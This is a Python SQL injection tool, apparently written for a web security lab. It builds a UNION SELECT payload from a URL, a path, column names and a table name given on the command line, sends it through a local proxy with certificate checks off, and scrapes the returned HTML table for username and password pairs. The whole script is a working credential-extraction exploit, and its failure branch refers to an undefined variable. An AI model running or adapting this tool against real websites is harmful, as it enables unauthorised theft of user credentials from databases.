import re
import sys
import requests
import urllib3
import time

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
BLUE = '\033[94m'
BLUE_BOLD = '\033[1;94m'
GREEN = '\033[92m'
GREEN_BOLD = '\033[1;92m'
RED = '\033[91m'
RED_BOLD = '\033[1;91m'
BOLD = '\033[1m'
ENDC = '\033[0m'  # Reset color

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
s = requests.Session()

def generate_payload(url, path, columns, table):
	payload = f"{url}{path}'+union+select+{columns}+from+{table}--"
	return payload

def parsing_response(payload):
    r = s.get(payload, verify=False, proxies=proxies)
    # print(r.status_code)
    if r.status_code == 200:
        print(f'{GREEN_BOLD}[+]{ENDC} SQLI {GREEN}successfully{ENDC} executed!')
        time.sleep(1.5)
        print(f'{BLUE_BOLD}[*]{ENDC} Trying to retrieve data...')
        time.sleep(1.5)
        # Parsing HTML
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Cari tr elements
        rows = soup.find_all('tr')

        pot_creds = {}

        # Cari th dan td
        for row in rows:
            th_element = row.find('th')
            td_element = row.find('td')

            # Extract isi th dan td
            if th_element and td_element:
                th_text = th_element.text.strip()
                td_text = td_element.text.strip()

                # gunakan regex untuk filter th(<20) dan td(<50) value 
                if re.match(r'^[a-zA-Z0-9]{1,20}$', th_text) and re.match(r'^[a-zA-Z0-9]{1,50}$', td_text):
                    pot_creds[th_text] = td_text

        if pot_creds:
            print(f'{GREEN_BOLD}[+]{ENDC} We got the potential creds:')
            for key, value in pot_creds.items():
                print(f'       - {key}:{value}')
        else:
            print(f'{RED_BOLD}[-]{ENDC} {RED}No creds found, We got nothing!{ENDC}')


    else:
        print(f'{RED_BOLD}[-]{ENDC} {RED}Failed to retrieve data. Status code: {response}{ENDC}')

    return False



if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
		path = sys.argv[2].strip()
		columns = sys.argv[3].strip()
		table = sys.argv[4].strip()
	except IndexError:
		print(f'{BLUE_BOLD}[*]{ENDC} Usage %s <url> <path> <cols> <table>' % sys.argv[0])
		print(f'{BLUE_BOLD}[*]{ENDC} Example: %s "www.example.com" "/filter?category=office" "username,password" "users" ' % sys.argv[0])
		sys.exit(-1)

	# payload = generate_payload(url, path, columns, table)
	if True:
		print(f'{BLUE_BOLD}[*]{ENDC} Trying to generate payload...')
		time.sleep(1)
		payload = generate_payload(url, path, columns, table)
		print(f'{GREEN_BOLD}[+]{ENDC} Successfully generating payload : {GREEN}{payload}{ENDC}')
		parsing_response(payload)